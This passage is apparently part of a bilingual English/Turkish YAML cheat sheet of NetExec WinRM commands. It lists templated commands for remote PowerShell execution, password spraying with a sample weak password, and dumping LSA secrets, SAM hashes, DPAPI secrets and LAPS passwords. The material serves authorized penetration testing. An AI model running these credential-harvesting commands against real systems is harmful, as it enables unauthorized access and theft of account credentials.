    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"

  - title:
      en: nxc winrm - execute command
      tr: nxc winrm - uzaktan komut çalıştırma
    desc:
      en: |
        Execute command on remote system via WinRM. Runs PowerShell command and
        displays output. Shows (Pwn3d!) on success.
      tr: |
        WinRM üzerinden uzak sistemde komut çalıştırır. PowerShell komutu koşulur, çıktısı
        görüntülenir. Başarıda (Pwn3d!) görüntülenir.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -X {{command|whoami}}"

  - title:
      en: nxc winrm - password spray
      tr: nxc winrm - parola püskürtme
    desc:
      en: |
        Password spray against WinRM services. Tests credentials against multiple
        WinRM hosts. Use --no-bruteforce for 1:1 user:password mapping.
      tr: |
        WinRM hizmetlerine parola püskürtme yapar. Bilgiler birden çok WinRM makinesinde sınanır.
        Birebir kullanıcı:parola eşleşmesi için --no-bruteforce kullanılır.
    command: "nxc winrm {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc winrm - dump LSA secrets
      tr: nxc winrm - LSA gizli verilerini dökme
    desc:
      en: |
        Dump LSA secrets from remote system via WinRM. Extracts cached credentials
        and service account passwords. Requires admin privileges.
      tr: |
        WinRM üzerinden uzak sistemden LSA gizli verilerini döker. Önbelleğe alınmış bilgiler ile
        hizmet hesabı parolaları çıkarılır. Yönetici yetkisi gerekir.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M lsassy"

  - title:
      en: nxc winrm - dump SAM database
      tr: nxc winrm - SAM veritabanını dökme
    desc:
      en: |
        Dump SAM database from remote system via WinRM. Extracts local account
        password hashes. Requires SYSTEM privileges.
      tr: |
        WinRM üzerinden uzak sistemden SAM veritabanını döker. Yerel hesap parola karmaları
        çıkarılır. SYSTEM yetkisi gerekir.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M sam"

  - title:
      en: nxc winrm - dump DPAPI secrets
      tr: nxc winrm - DPAPI gizli verilerini dökme
    desc:
      en: |
        Dump DPAPI secrets from remote system via WinRM. Extracts encrypted
        credentials stored by Windows applications.
      tr: |
        WinRM üzerinden uzak sistemden DPAPI gizli verilerini döker. Windows uygulamalarının
        sakladığı şifreli bilgiler çıkarılır.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M dpapi"

  - title:
      en: nxc winrm - defeat LAPS
      tr: nxc winrm - LAPS parolalarını alma
    desc:
      en: |
        Extract LAPS passwords via WinRM. Retrieves managed local admin passwords
        from domain through WinRM.
      tr: |
        WinRM üzerinden LAPS parolalarını alır. Etki alanından yönetilen yerel yönetici parolaları
        WinRM aracılığıyla çekilir.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M laps"

